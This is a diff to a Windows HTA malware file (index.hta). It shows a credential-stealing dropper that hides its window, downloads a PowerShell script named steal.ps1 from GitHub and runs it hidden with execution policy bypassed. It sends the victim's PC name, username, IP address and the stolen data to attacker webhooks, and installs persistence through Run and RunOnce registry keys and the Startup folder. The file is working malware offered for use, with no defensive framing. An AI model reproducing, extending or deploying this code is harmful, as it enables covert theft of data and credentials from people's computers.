@@ -1,12 +1,13 @@
 <!-- language: HTML/HTA, file: index.hta -->
 <!-- target: Windows 10/11, mshta.exe -->
-<!-- *two webhooks: WH_PRIMARY (first hit) / WH_LOG (re-grabs, clean separation)*
-     *steal.ps1 invoked with -Webhook arg per pass* -->
+<!-- *skidded rogue Gist URL; strictly fetching lozix94-afk raw link*
+     *two webhooks: WH_PRIMARY (first hit) / WH_LOG (re-grabs)*
+     *upgraded red UI on all embeds* -->
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
 <script language="VBScript">
-' --- WHITE SCREEN FLASH ---
+' --- FAST WHITE SCREEN FLASH (1.2s) ---
 Dim sw, shh, fw, fh, fx, fy
 Set sh = CreateObject("WScript.Shell")
 sw  = screen.width
@@ -17,7 +18,7 @@ fx  = Int((sw  - fw) / 2)
 fy  = Int((shh - fh) / 2)
 window.resizeTo fw, fh
 window.moveTo fx, fy
-SetTimeout "window.close()", 2500
+SetTimeout "window.close()", 1200
 
 On Error Resume Next
 
@@ -32,12 +33,12 @@ USER       = sh.ExpandEnvironmentStrings("%USERNAME%")
 
 Call PostEmbed(WH_PRIMARY, ":satellite: Session Start", "**PC:** ``" & PC & "`` | **User:** ``" & USER & "``", 16711680)
 
-' --- first pass: PRIMARY webhook ---
+' --- First pass: PRIMARY ---
 Call RunSteal(WH_PRIMARY)
 Call IP(WH_PRIMARY)
 Call Persistence
 
-' --- re-grabs: LOG webhook ---
+' --- Re-grabs: LOG ---
 Dim attempt
 For attempt = 2 To 3
     Call PostEmbed(WH_LOG, ":arrows_counterclockwise: Re-run steal.ps1 " & attempt & "/3", "**PC:** ``" & PC & "``", 16711680)
@@ -48,7 +49,6 @@ Next
 
 window.close()
 
-' --- run steal.ps1, pass webhook ---
 Sub RunSteal(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -71,20 +71,19 @@ Sub RunSteal(targetWH)
     f.Close
     Set f = Nothing
 
+    ' Pass the target webhook arg
     sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """ -Webhook """ & targetWH & """", 0, True
     On Error Resume Next
     fso.DeleteFile psf, True
     On Error Goto 0
 End Sub
 
-' --- sleep helper ---
 Sub SleepSeconds(s)
     Dim w: Set w = CreateObject("WScript.Shell")
     w.Run "cmd /c timeout /t " & s & " /nobreak >nul", 0, True
     Set w = Nothing
 End Sub
 
-' --- IP Function ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -102,7 +101,6 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
     On Error Resume Next
@@ -115,7 +113,6 @@ Sub Persistence()
     Call PostEmbed(WH_PRIMARY, ":pushpin: Persistence", "**3 startup methods installed**`n🔴 HKCU Run`n🔴 HKCU RunOnce`n🔴 Startup Folder", 16711680)
 End Sub
 
-' --- PostEmbed (accepts webhook arg) ---
 Sub PostEmbed(targetWH, t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -127,7 +124,6 @@ Sub PostEmbed(targetWH, t, d, c)
     Set h = Nothing
 End Sub
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
